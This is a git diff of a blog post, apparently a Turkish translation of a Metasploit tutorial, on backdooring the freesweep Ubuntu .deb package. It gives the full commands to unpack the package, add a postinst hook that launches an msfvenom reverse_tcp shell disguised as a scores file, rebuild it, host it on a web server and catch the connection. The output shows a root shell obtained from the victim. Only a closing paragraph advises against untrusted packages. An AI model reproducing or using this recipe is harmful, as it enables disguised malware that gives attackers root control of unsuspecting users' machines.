@@ -5,7 +5,7 @@ date: 2017-05-20 08:10:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -16,13 +16,20 @@ tags:
 - Metasploit Framework binary linux trojan
 - msf binary linux trojan
 
-excerpt: Nessus, kişisel ve ticari olmayan kullanım için ücretsiz olarak edinilebilen bir zafiyet tarama programıdır. Tenable firması tarafından geliştirilmekte olan Nessus tarama programını ve sonuçlarını Metasploit Framework içerisinde kullanabilirsiniz.
+excerpt: İstemci taraflı saldırılara örnek olarak bir önceki yazımızda Windows platformu için ```.exe``` uzantılı bir çalıştırılabilir dosya oluşturmuştuk. Linux işletim sistemlerinin kullandığı tıkla ve çalıştır dosya tiplerinde de dosya oluşturabiliriz. Bu yazıda, ```.deb``` uzantılı bir dosya oluşturacağız.
 ---
 
-In order to demonstrate that client side attacks and trojans are not exclusive to the Windows world, we will package a Metasploit payload in with an Ubuntu deb package to give us a shell on Linux. An excellent video was made by Redmeat_uk demonstrating this technique that you can view at http://securitytube.net/Ubuntu-Package-Backdoor-using-a-Metasploit-Payload-video.aspx
+İstemci taraflı saldırılara örnek olarak bir önceki yazımızda Windows platformu için ```.exe``` uzantılı bir çalıştırılabilir dosya oluşturmuştuk. Linux işletim sistemlerinin kullandığı tıkla ve çalıştır dosya tiplerinde de dosya oluşturabiliriz. Bu yazıda, ```.deb``` uzantılı bir dosya oluşturacağız.
 
-We first need to download the package that we are going to infect and move it to a temporary working directory. In our example, we will use the package freesweep, a text-based version of Mine Sweeper.
+Ubuntu işletim sistemini hedef alan bu dosyanın oluşturulması ilk olarak biraz karışık gelebilir ancak adımları teker teker inceleyerek devam ederseniz kavramak daha kolay olacaktır. 
 
+Öncelikle, içine payload yerleştireceğimiz bir programa ihtiyacımız var. Örnek olarak "Mine Sweeper" programını kullanalım.
+
+## Paketi indirelim
+
+Paketi ```--download-only``` parametresiyle indirdiğimizde, işletim sistemimize kurulmayacaktır. Daha sonra indirdiğimiz paketi üzerinde çalışmak üzere oluşturacağımız ```/tmp/evil``` klasörüne taşıyacağız.
+
+```sh
 root@kali:~# apt-get --download-only install freesweep
 Reading package lists... Done
 Building dependency tree
@@ -32,13 +39,25 @@ root@kali:~# mkdir /tmp/evil
 root@kali:~# mv /var/cache/apt/archives/freesweep_0.90-1_i386.deb /tmp/evil
 root@kali:~# cd /tmp/evil/
 root@kali:/tmp/evil#
-Next, we need to extract the package to a working directory and create a DEBIAN directory to hold our additional added “features”.
+```
 
+Artık ```/tmp/evil``` klasörünün içerisinde ```freesweep_0.90-1_i386.deb``` isimli bir Debian paketimiz var. İndirdiğiniz .deb uzantılı dosyanın ismi ve sürüm numarası farklı olabilir. İsmini ```ls``` komutuyla kontrol ederek örneklerdeki komutlara o şekilde uygulamalısınız. 
+
+## Paketi Açalım
+
+Şimdi bu ```.deb``` uzantılı paketi, sıkıştırılmış bir dosyayı açmaya benzer şekilde açmamız gerekiyor. Bu paketi aşağıdaki komutla ```/tmp/evil``` klasörü içinde ```work``` klasörüne çıkartıyoruz. Ardından, bizim ilave edeceğimiz özelliklerin bulunacağı ```DEBIAN``` isimli bir klasörü ```/tmp/evil/work``` klasörü altına oluşturuyoruz.
+
+```sh
 root@kali:/tmp/evil# dpkg -x freesweep_0.90-1_i386.deb work
 root@kali:/tmp/evil# mkdir work/DEBIAN
-In the DEBIAN directory, create a file named control that contains the following:
+```
+## control Dosyası oluşturalım
 
-root@kali:/tmp/evil/work/DEBIAN# cat control
+Debian klasörünün içerisinde ```control``` isimli bir dosya oluşturup içerisine aşağıdaki Metni yapıştırıp kaydediyoruz. Dosya içeriği aşağıdaki gibi ```cat control``` komutuyla kontrol ediyoruz.
+
+**control** dosyası içeriği
+
+```sh
 Package: freesweep
 Version: 0.90-1
 Section: Games and Amusement
@@ -51,14 +70,24 @@ Description: a text-based minesweeper
  by the computer. Unlike most implementations of this game, Freesweep
  works in any visual text display - in Linux console, in an xterm, and in
  most text-based terminals currently in use.
-We also need to create a post-installation script that will execute our binary. In our DEBIAN directory, we’ll create a file named postinst that contains the following:
+```
 
-root@kali:/tmp/evil/work/DEBIAN# cat postinst
+## postinst dosyası oluşturalım
+
+Kurulum sonrası çalışması için ayrıca bir bash script dosyasına daha ihtiyacımız var. Yine yukarıdaki gibi ```DEBIAN``` klasörü içine ```postinst``` isimli bir dosya oluşturuyoruz. İçerisine aşağıdaki kod satırlarını yapıştırıyoruz. 
+
+**postinst** dosya içeriği
+
+```sh
 #!/bin/sh
 
 sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &
-Now we’ll create our malicious payload. We’ll be creating a reverse shell to connect back to us named freesweep_scores.
+```
+## Payload Oluşturalım
 
+Şimdi içerisinde zararlı kodların olduğu dosyayı oluşturabiliriz. Bunun için aşağıdaki komutu kullanarak ```linux/x86/shell/reverse_tcp``` payload modülünü kullanacağız. Komut içerisinde ```LHOST``` ve ```LPORT``` olarak verdiğimiz değişkenleri kendiniz belirleyebilirsiniz.
+
+```sh
 root@kali:~# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
 Found 10 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
@@ -66,30 +95,39 @@ x86/shikata_ga_nai succeeded with size 98 (iteration=0)
 x86/shikata_ga_nai chosen with final size 98
 Payload size: 98 bytes
 Saved as: /tmp/evil/work/usr/games/freesweep_scores
-We’ll now make our post-installation script executable and build our new package. The built file will be named work.deb so we will want to change that to freesweep.deb and copy the package to our web root directory.
+```
+## Yeniden paketleme
 
+Artık, ```postinst``` dosyamızı çalıştırılabilir hale getirip ```.deb``` paketini derleyebiliriz. Komut sonucunda oluşturulacak ```work.deb``` paketinin ismini ```freesweep.deb``` olarak değiştirip Apache Server klasörüne (```/var/www``` veya ```/var/www/html```) yükleyebiliriz. Artık dosyamız Web sunucuda indirilebilir durumdadır.
+
+```sh
 root@kali:/tmp/evil/work/DEBIAN# chmod 755 postinst
 root@kali:/tmp/evil/work/DEBIAN# dpkg-deb --build /tmp/evil/work
 dpkg-deb: building package `freesweep' in `/tmp/evil/work.deb'.
 root@kali:/tmp/evil# mv work.deb freesweep.deb
 root@kali:/tmp/evil# cp freesweep.deb /var/www/
-If it is not already running, we’ll need to start the Apache web server.
+```
 
-root@kali:/tmp/evil# service apache2 start
-We will need to set up the Metasploit multi/handler to receive the incoming connection.
+## Dinleyici Handler Oluşturma
 
+Şimdi, bir tıklama veya çalıştırma ile gelecek bağlantı isteklerini dinlemek için dinleyici oluşturalım. Burada komuta vereceğimiz ```LHOST``` ve ```LPORT``` değerleri, payload oluştururken girilen değerler ile aynı olmalıdır.
+
+```sh
 root@kali:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run; exit -y"
 PAYLOAD => linux/x86/shell/reverse_tcp
 LHOST => 192.168.1.101
 LPORT => 443
 [*] Started reverse handler on 192.168.1.101:443
 [*] Starting the payload handler...
-On our Ubuntu victim, we have somehow convinced the user to download and install our awesome new game.
+```
 
+## Sonuç
+
+Herhangi bir kullanıcı, bu hazırladığımız ```freesweep.deb``` paketini indirip çalıştırdığında dinleme yapan ```exploit/multi/handler``` modülümüz hedef bilgisayarda oturum açacaktır.
+
+```sh
 ubuntu@ubuntu:~$ wget http://192.168.1.101/freesweep.deb
-
 ubuntu@ubuntu:~$ sudo dpkg -i freesweep.deb
-As the victim installs and plays our game, we have received a shell!
 
 [*] Sending stage (36 bytes)
 [*] Command shell session 1 opened (192.168.1.101:443 -> 192.168.1.175:1129)
@@ -109,3 +147,7 @@ hostname
 ubuntu
 id
 uid=0(root) gid=0(root) groups=0(root)
+```
+## Tavsiye
+
+Görüldüğü gibi zararlı yazılımlar sadece Windows'a özel değildir. Linux kullanıcılarının da tıkla ve çalıştır programlara dikkatle yaklaşması gerekmektedir. Güvenilir olmayan kaynaklardan paket yüklememenizi tavsiye ediyoruz.
